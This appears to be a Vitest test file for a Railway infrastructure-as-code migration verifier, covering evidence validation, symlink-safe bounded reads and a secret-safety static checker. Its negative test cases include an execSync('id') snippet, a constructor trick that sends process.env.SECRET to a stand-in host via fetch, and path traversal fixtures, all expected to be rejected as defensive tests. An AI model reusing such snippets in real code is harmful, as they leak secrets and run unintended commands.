import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  generatedIacSourceIsSecretSafe,
  RAILWAY_IAC_MIGRATION_REASONS,
  type RailwayIacFilesystemEvidence,
  validateRailwayIacMigrationEvidence,
} from "../../scripts/railway-iac-migration-contract";
import {
  isDirectEntrypoint,
  localFilesystemEvidence,
  MAX_GENERATED_IAC_BYTES,
  MAX_LEGACY_CONFIG_BYTES,
  readBoundedFile,
  readBoundedTextFile,
} from "../../scripts/verify-railway-iac-migration";

const NOW = Date.parse("2026-08-28T06:00:00.000Z");
const GENERATED_SOURCE = `
  import { defineRailway, preserve, project, service } from "railway/iac";
  const web = service("fixture", { env: { ONLINE_OPS_TOKEN: preserve() } });
  export default defineRailway(() => project("fixture", { resources: [web] }));
`;
const GENERATED_SHA = createHash("sha256")
  .update(GENERATED_SOURCE)
  .digest("hex");
const FILESYSTEM: RailwayIacFilesystemEvidence = {
  generatedIacPath: ".railway/railway.ts",
  generatedIacSha256: GENERATED_SHA,
  generatedIacSecretSafe: true,
  legacyRepositoryFilePresent: true,
  legacyRepositoryFileSha256: "f".repeat(64),
};

function validEvidence(nowMs = NOW) {
  const capturedAt = new Date(nowMs).toISOString();
  const inventoryObservedAt = new Date(nowMs - 5_000).toISOString();
  const preObservedAt = new Date(nowMs - 4_000).toISOString();
  const cutoverObservedAt = new Date(nowMs - 3_000).toISOString();
  const effectiveObservedAt = new Date(nowMs - 2_000).toISOString();
  const planCapturedAt = new Date(nowMs - 1_000).toISOString();
  const target = {
    projectId: "project-fixture",
    projectName: "project fixture",
    environmentId: "environment-fixture",
    environmentName: "production",
    serviceId: "service-fixture",
    serviceName: "service fixture",
  };
  const targetFields = {
    projectId: target.projectId,
    environmentId: target.environmentId,
    serviceId: target.serviceId,
  };
  const source = {
    repository: "AutoDevJapan/FourBrosMahjong",
    branch: "main",
    rootDirectory: null,
    revision: "a".repeat(40),
  };
  const configSource = {
    repository: source.repository,
    branch: source.branch,
    rootDirectory: source.rootDirectory,
  };
  const config = {
    builder: "DOCKERFILE",
    dockerfilePath: "Dockerfile",
    startCommand: "node --import tsx server/start.ts",
    healthcheckPath: "/healthz",
    healthcheckTimeoutSeconds: 60,
    replicaCount: 1,
    restartPolicyType: "ON_FAILURE",
    restartPolicyMaxRetries: 10,
    overlapSeconds: 0,
    drainingSeconds: 0,
    watchPatterns: [] as string[],
  };
  const resourceAddresses = [
    "project.fixture",
    "service.service-fixture",
    "service.service-fixture.variables",
    "service.service-fixture.domain.primary",
  ];
  return {
    schemaVersion: 1,
    capturedAt,
    cliEvidence: {
      capturedFromHelp: true,
      cliVersion: "5.42.1",
      pullSupported: true,
      planSupported: true,
      planJsonSupported: true,
      detailedExitCodeSupported: true,
    },
    target,
    inventory: {
      observedAt: inventoryObservedAt,
      source: "authorized-railway-config-pull",
      ownershipMode: "full-project",
      targetServiceAddress: "service.service-fixture",
      resourceAddresses,
      ...targetFields,
      serviceName: target.serviceName,
      authorityEvidenceSha256: "d".repeat(64),
    },
    generatedIac: {
      path: ".railway/railway.ts",
      sha256: GENERATED_SHA,
      generatedBy: "authorized-railway-config-pull",
      resourceAddresses: [...resourceAddresses],
      ownershipMode: "full-project",
      cliVersion: "5.42.1",
      sdkPackageVersion: "3.11.0",
      sdkSchemaRevision: "c1b6ea8dd3e815e57257b1f17637e59d31db73b5",
      compatibilityReviewed: true,
      manualSecretReviewCompleted: true,
      decryptVariablesUsed: false,
      omitPreservedVariablesUsed: false,
      targetServiceConfig: structuredClone(config),
      targetServiceSource: structuredClone(configSource),
    },
    ownershipCutover: {
      observedAt: cutoverObservedAt,
      method: "authorized-manual-clear",
      ...targetFields,
      evidenceSha256: "e".repeat(64),
      legacyFileSha256: FILESYSTEM.legacyRepositoryFileSha256,
      configFileSettingCleared: true,
      repositoryFileRetained: true,
      deleteFilesUsed: false,
      nonInteractiveFlagsUsed: false,
    },
    preCutoverReadback: {
      observedAt: preObservedAt,
      ...targetFields,
      source: structuredClone(source),
      config: structuredClone(config),
    },
    parityPlan: {
      capturedAt: planCapturedAt,
      sourceSha256: GENERATED_SHA,
      planOutputSha256: "c".repeat(64),
      cliVersion: "5.42.1",
      invocation:
        "railway config plan --json --detailed-exit-code --file .railway/railway.ts",
      exitCode: 0,
      ...targetFields,
      additions: [] as string[],
      changes: [] as string[],
      destructions: [] as string[],
      unrelatedChanges: [] as string[],
      variableValuesRedacted: true,
      detailedExitCodeUsed: true,
      showValuesUsed: false,
      decryptVariablesUsed: false,
    },
    effectiveReadback: {
      observedAt: effectiveObservedAt,
      ...targetFields,
      source: structuredClone(source),
      config: structuredClone(config),
    },
  };
}

function reasonsFor(
  mutate: (evidence: ReturnType<typeof validEvidence>) => void,
  filesystem = FILESYSTEM,
  nowMs = NOW,
) {
  const evidence = validEvidence();
  mutate(evidence);
  return validateRailwayIacMigrationEvidence(evidence, filesystem, nowMs)
    .reasons;
}

function withTemporaryRepository<T>(callback: (rootDirectory: string) => T): T {
  const rootDirectory = mkdtempSync(join(tmpdir(), "railway-iac-read-"));
  try {
    mkdirSync(join(rootDirectory, ".railway"));
    writeFileSync(
      join(rootDirectory, "railway.json"),
      readFileSync(resolve(process.cwd(), "railway.json")),
    );
    return callback(rootDirectory);
  } finally {
    rmSync(rootDirectory, { force: true, recursive: true });
  }
}

describe("Railway IaC parity snapshot contract (#742)", () => {
  it("passes only post-cutover parity evidence without authorizing an operation", () => {
    expect(
      validateRailwayIacMigrationEvidence(validEvidence(), FILESYSTEM, NOW),
    ).toEqual({
      schemaVersion: 1,
      migrationEvidence: "pass",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: [],
    });
  });

  it("holds the current repository until generated IaC exists", () => {
    const currentFilesystem = {
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      legacyRepositoryFilePresent: true,
      legacyRepositoryFileSha256: FILESYSTEM.legacyRepositoryFileSha256,
    } satisfies RailwayIacFilesystemEvidence;
    expect(
      validateRailwayIacMigrationEvidence(
        validEvidence(),
        currentFilesystem,
        NOW,
      ).reasons,
    ).toEqual(["generated-iac-missing", "secret-safety-unverified"]);
  });

  it.each([
    ["missing", () => undefined],
    [
      "oversized",
      (generatedPath: string) => {
        writeFileSync(
          generatedPath,
          Buffer.alloc(MAX_GENERATED_IAC_BYTES + 1, "x"),
        );
      },
    ],
    [
      "read failure",
      (generatedPath: string) => {
        symlinkSync("missing-target", generatedPath);
      },
    ],
  ])("keeps %s generated IaC fail-closed", (_caseName, prepare) => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      prepare(join(rootDirectory, ".railway", "railway.ts"));
      return localFilesystemEvidence(rootDirectory);
    });

    const evidence = validEvidence();
    evidence.ownershipCutover.legacyFileSha256 =
      filesystem.legacyRepositoryFileSha256;
    expect(filesystem).toMatchObject({
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      legacyRepositoryFilePresent: true,
    });
    expect(
      validateRailwayIacMigrationEvidence(evidence, filesystem, NOW).reasons,
    ).toEqual(["generated-iac-missing", "secret-safety-unverified"]);
  });

  it("rejects a generated IaC file beneath a symlinked parent directory", () => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      const realDirectory = join(rootDirectory, "real-railway");
      mkdirSync(realDirectory);
      writeFileSync(join(realDirectory, "railway.ts"), GENERATED_SOURCE);
      rmSync(join(rootDirectory, ".railway"), {
        force: true,
        recursive: true,
      });
      symlinkSync(realDirectory, join(rootDirectory, ".railway"));
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem).toMatchObject({
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
    });
  });

  it("rejects link/.. traversal that escapes the normalized root", () => {
    const fixtureDirectory = mkdtempSync(
      join(tmpdir(), "railway-iac-traversal-"),
    );
    try {
      const rootDirectory = join(fixtureDirectory, "root");
      const outsideDirectory = join(fixtureDirectory, "outside");
      mkdirSync(rootDirectory);
      mkdirSync(outsideDirectory);
      writeFileSync(join(fixtureDirectory, "target"), "outside\n");
      symlinkSync(outsideDirectory, join(rootDirectory, "link"));

      const traversalPath = join(rootDirectory, "link", "..", "target");
      expect(readBoundedFile(traversalPath, 64, rootDirectory)).toBeNull();
      expect(readBoundedTextFile(traversalPath, 64, rootDirectory)).toBeNull();
    } finally {
      rmSync(fixtureDirectory, { force: true, recursive: true });
    }
  });

  it.each([
    [
      "missing",
      (legacyPath: string) => {
        unlinkSync(legacyPath);
      },
    ],
    [
      "oversized",
      (legacyPath: string) => {
        writeFileSync(
          legacyPath,
          Buffer.alloc(MAX_LEGACY_CONFIG_BYTES + 1, "x"),
        );
      },
    ],
    [
      "directory",
      (legacyPath: string) => {
        rmSync(legacyPath, { force: true, recursive: true });
        mkdirSync(legacyPath);
      },
    ],
    [
      "symlink",
      (legacyPath: string, rootDirectory: string) => {
        const targetPath = join(rootDirectory, "legacy-target.json");
        writeFileSync(targetPath, "{}\n");
        rmSync(legacyPath, { force: true, recursive: true });
        symlinkSync(targetPath, legacyPath);
      },
    ],
    [
      "read failure",
      (legacyPath: string, rootDirectory: string) => {
        rmSync(legacyPath, { force: true, recursive: true });
        symlinkSync(join(rootDirectory, "missing-target.json"), legacyPath);
      },
    ],
  ])("keeps %s legacy config fail-closed", (_caseName, prepare) => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      const legacyPath = join(rootDirectory, "railway.json");
      prepare(legacyPath, rootDirectory);
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem).toMatchObject({
      legacyRepositoryFilePresent: false,
      legacyRepositoryFileSha256: null,
    });
  });

  it("reads a regular legacy config and records its bounded raw hash", () => {
    const expected = readFileSync(resolve(process.cwd(), "railway.json"));
    const filesystem = withTemporaryRepository((rootDirectory) =>
      localFilesystemEvidence(rootDirectory),
    );

    expect(filesystem).toMatchObject({
      legacyRepositoryFilePresent: true,
      legacyRepositoryFileSha256: createHash("sha256")
        .update(expected)
        .digest("hex"),
    });
  });

  it("reads an ordinary file consistently across the bounded read passes", () => {
    withTemporaryRepository((rootDirectory) => {
      const filePath = join(rootDirectory, "ordinary.txt");
      const expected = Buffer.from("ordinary content\n");
      writeFileSync(filePath, expected);

      expect(readBoundedFile(filePath, expected.length, rootDirectory)).toEqual(
        expected,
      );
      expect(
        readBoundedTextFile(filePath, expected.length, rootDirectory),
      ).toBe(expected.toString("utf8"));
    });
  });

  it("resolves a symlinked verifier entrypoint before invoking main", () => {
    const moduleUrl = new URL(
      "../../scripts/verify-railway-iac-migration.ts",
      import.meta.url,
    ).href;
    const symlinkPath = join(
      mkdtempSync(join(tmpdir(), "railway-entrypoint-")),
      "verify.ts",
    );
    try {
      symlinkSync(fileURLToPath(moduleUrl), symlinkPath);
      expect(isDirectEntrypoint(symlinkPath, moduleUrl)).toBe(true);
    } finally {
      rmSync(dirname(symlinkPath), { force: true, recursive: true });
    }
  });

  it("accepts a regular legacy config at the byte limit", () => {
    const filesystem = withTemporaryRepository((rootDirectory) => {
      writeFileSync(
        join(rootDirectory, "railway.json"),
        Buffer.alloc(MAX_LEGACY_CONFIG_BYTES, "x"),
      );
      return localFilesystemEvidence(rootDirectory);
    });

    expect(filesystem.legacyRepositoryFilePresent).toBe(true);
    expect(filesystem.legacyRepositoryFileSha256).toBe(
      createHash("sha256")
        .update(Buffer.alloc(MAX_LEGACY_CONFIG_BYTES, "x"))
        .digest("hex"),
    );
  });

  it.each([
    [
      "cli-capability-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.cliEvidence.cliVersion = "5.42.0";
        e.cliEvidence.detailedExitCodeSupported = false;
      },
    ],
    [
      "evidence-stale",
      (e: ReturnType<typeof validEvidence>) => {
        e.capturedAt = new Date(NOW - 300_001).toISOString();
      },
    ],
    [
      "target-identity-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.target.environmentName = "staging";
      },
    ],
    [
      "resource-inventory-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.inventory.resourceAddresses = ["service.another"];
      },
    ],
    [
      "generated-iac-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.generatedIac.sdkSchemaRevision = "b".repeat(40);
      },
    ],
    [
      "generated-service-parity-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.generatedIac.targetServiceConfig.startCommand = "pnpm server:start";
      },
    ],
    [
      "ownership-cutover-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.ownershipCutover.configFileSettingCleared = false;
      },
    ],
    [
      "evidence-order-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.ownershipCutover.observedAt = e.preCutoverReadback.observedAt;
      },
    ],
    [
      "effective-readback-invalid",
      (e: ReturnType<typeof validEvidence>) => {
        e.effectiveReadback.config.healthcheckTimeoutSeconds = 0;
      },
    ],
    [
      "parity-readback-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.effectiveReadback.config.startCommand = "pnpm server:start";
      },
    ],
    [
      "parity-plan-target-mismatch",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.serviceId = "service-other";
      },
    ],
    [
      "parity-plan-not-clean",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.exitCode = 2;
        e.parityPlan.changes.push("service.deploy.startCommand");
      },
    ],
    [
      "secret-safety-unverified",
      (e: ReturnType<typeof validEvidence>) => {
        e.parityPlan.detailedExitCodeUsed = false;
        e.parityPlan.showValuesUsed = true;
      },
    ],
  ])("reports %s for its deterministic mutation", (reason, mutate) => {
    expect(reasonsFor(mutate)).toContain(reason);
  });

  it("requires the retained legacy repository file", () => {
    expect(
      validateRailwayIacMigrationEvidence(
        validEvidence(),
        {
          ...FILESYSTEM,
          legacyRepositoryFilePresent: false,
          legacyRepositoryFileSha256: null,
        },
        NOW,
      ).reasons,
    ).toContain("legacy-config-missing");
  });

  it("rejects invalid clocks and malformed schemas without reflection", () => {
    expect(
      validateRailwayIacMigrationEvidence(validEvidence(), FILESYSTEM, -1)
        .reasons,
    ).toContain("clock-invalid");
    expect(
      validateRailwayIacMigrationEvidence(
        { secret: "SECRET_SENTINEL" },
        FILESYSTEM,
        NOW,
      ).reasons,
    ).toEqual(["invalid-schema"]);
  });

  it("requires static and manual secret review without treating either as proof", () => {
    expect(generatedIacSourceIsSecretSafe(GENERATED_SOURCE)).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `const env = { ONLINE_OPS_TOKEN: "SECRET_SENTINEL" }; preserve();`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `${GENERATED_SOURCE}\n// Bearer abcdefghijklmnopqrstuvwxyz`,
      ),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe("const config = {}")).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { PUBLIC_VALUE: "not-secret-but-not-preserved" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: preserve("RAW") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: ref("RAW") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: ref(resource) } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); service("fixture", { env: { VALUE: ref(resource, "output") } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; service("fixture", { env: { VALUE: ref("resource", "output") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { env: { DATABASE_URL: db.env.DATABASE_URL } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway((ctx) => service("fixture", { env: { VALUE: ctx.shared.SECRET } }));`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const ctx = { shared: { VALUE: "SECRET_SENTINEL" } }; service("fixture", { env: { VALUE: ctx.shared.VALUE } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const read = (ctx) => service("fixture", { env: { VALUE: ctx.shared.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, preserve, project, service } from "railway/iac"; export default defineRailway(() => { const preserve = () => "SECRET_SENTINEL"; const web = service("fixture", { env: { TOKEN: preserve() } }); return project("fixture", { resources: [web] }); });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, project, ref, service } from "railway/iac"; export default defineRailway(() => { const resource = service("other", {}); const ref = () => "SECRET_SENTINEL"; const web = service("fixture", { env: { TOKEN: ref(resource, "output") } }); return project("fixture", { resources: [resource, web] }); });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); const build = (ref) => service("fixture", { env: { TOKEN: ref(resource, "output") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const build = (preserve) => service("fixture", { env: { TOKEN: preserve() } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { preserve, service } from "railway/iac"; const build = function preserve() { return service("fixture", { env: { TOKEN: preserve() } }); };`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const host = { runtime: Bun }; service("fixture", { source: host.runtime.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const host = { runtime: Bun }; service("fixture", { source: host.runtime["env"].SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: import.meta.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: ctx.shared.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); service("fixture", { source: db.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const resource = service("other", {}); const { env } = resource; service("fixture", { source: env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const make = ({ env }) => service("fixture", { source: env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const untrusted = ctx; service("fixture", { source: ref(untrusted, "output") });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ["TOKEN"]: "SECRET_SENTINEL" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { "TOKEN": "SECRET_SENTINEL" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { TOKEN: ("SECRET_SENTINEL") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { TOKEN: { value: "SECRET_SENTINEL" } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { options: { ["TOKEN"]: ("SECRET_SENTINEL") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { ref, service } from "railway/iac"; const resource = service("other", {}); service("fixture", { options: { TOKEN: (ref(resource, "output")) } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); { const db = Bun; service("fixture", { env: { VALUE: db.env.SECRET } }); }`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); const make = (db) => service("fixture", { env: { VALUE: db.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: Bun.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: Deno.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const foo = Bun; service("fixture", { env: { VALUE: foo.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: Bun.env.SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { env: { VALUE: ctx.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; service("fixture", { source: Bun["env"].SECRET });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { env: { VALUE: process.env.RAW } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `const raw = process.env.RAW; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `const env = {}; service("fixture", { env });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { ["env"]: { VALUE: "RAW" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { [env]: { VALUE: preserve() } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import "./secret"; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe(`export * from "./secret";`)).toBe(
      false,
    );
    expect(
      generatedIacSourceIsSecretSafe(`export { secret } from "./secret";`),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe(`export * from "railway/iac";`)).toBe(
      false,
    );
    expect(
      generatedIacSourceIsSecretSafe(
        `import { execSync } from "node:child_process"; execSync("id");`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import("./secret"); service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(`unknownCall(); service("fixture", {});`),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; while (true) {}`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; Object.prototype.x = "y";`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        'import { service } from "railway/iac"; service.constructor`return fetch("https://x/?" + process.env.SECRET)`;',
      ),
    ).toBe(false);
    expect(
      reasonsFor((evidence) => {
        evidence.generatedIac.manualSecretReviewCompleted = false;
      }),
    ).toContain("secret-safety-unverified");
  });

  it("keeps the checked-in legacy mapping at parity", () => {
    const railwayJson = JSON.parse(
      readFileSync(resolve(process.cwd(), "railway.json"), "utf8"),
    );
    const evidence = validEvidence();
    expect(evidence.preCutoverReadback.config).toMatchObject({
      builder: railwayJson.build.builder,
      dockerfilePath: railwayJson.build.dockerfilePath,
      startCommand: railwayJson.deploy.startCommand,
      healthcheckPath: railwayJson.deploy.healthcheckPath,
      healthcheckTimeoutSeconds: railwayJson.deploy.healthcheckTimeout,
      restartPolicyType: railwayJson.deploy.restartPolicyType,
      restartPolicyMaxRetries: railwayJson.deploy.restartPolicyMaxRetries,
    });
  });

  it("covers every fixed reason", () => {
    const observed = new Set<string>();
    const collect = (
      evidence: unknown,
      filesystem = FILESYSTEM,
      nowMs = NOW,
    ) => {
      for (const reason of validateRailwayIacMigrationEvidence(
        evidence,
        filesystem,
        nowMs,
      ).reasons) {
        observed.add(reason);
      }
    };
    collect(null);
    collect(validEvidence(), {
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      legacyRepositoryFilePresent: false,
      legacyRepositoryFileSha256: null,
    });
    const invalid = validEvidence();
    invalid.capturedAt = new Date(NOW - 300_001).toISOString();
    invalid.cliEvidence.planSupported = false;
    invalid.target.environmentName = "staging";
    invalid.inventory.resourceAddresses = [];
    invalid.generatedIac.sha256 = "bad";
    invalid.ownershipCutover.configFileSettingCleared = false;
    invalid.preCutoverReadback.observedAt = "bad";
    invalid.effectiveReadback.config.startCommand = "other";
    invalid.parityPlan.projectId = "other";
    invalid.parityPlan.exitCode = 2;
    invalid.parityPlan.destructions.push("service.deleted");
    invalid.parityPlan.showValuesUsed = true;
    collect(invalid, FILESYSTEM, Number.NaN);
    expect([...observed].sort()).toEqual([...RAILWAY_IAC_MIGRATION_REASONS]);
  });

  it("CLI is non-reflective and holds the current repository", () => {
    const secret = "SECRET_SENTINEL";
    const currentEvidence = validEvidence(Date.now());
    currentEvidence.ownershipCutover.legacyFileSha256 = createHash("sha256")
      .update(readFileSync(resolve(process.cwd(), "railway.json")))
      .digest("hex");
    const currentResult = spawnSync(
      process.execPath,
      ["--import", "tsx", "scripts/verify-railway-iac-migration.ts"],
      {
        cwd: process.cwd(),
        input: JSON.stringify(currentEvidence),
        encoding: "utf8",
      },
    );
    expect(currentResult.status).toBe(1);
    expect(currentResult.stderr).toBe("");
    expect(JSON.parse(currentResult.stdout)).toEqual({
      schemaVersion: 1,
      migrationEvidence: "hold",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: ["generated-iac-missing", "secret-safety-unverified"],
    });

    const malformedResult = spawnSync(
      process.execPath,
      ["--import", "tsx", "scripts/verify-railway-iac-migration.ts"],
      {
        cwd: process.cwd(),
        input: JSON.stringify({ ...currentEvidence, secret }),
        encoding: "utf8",
      },
    );
    expect(malformedResult.status).toBe(1);
    expect(malformedResult.stderr).toBe("");
    expect(malformedResult.stdout).not.toContain(secret);
    expect(JSON.parse(malformedResult.stdout)).toEqual({
      schemaVersion: 1,
      migrationEvidence: "hold",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: ["invalid-schema"],
    });
  });
});
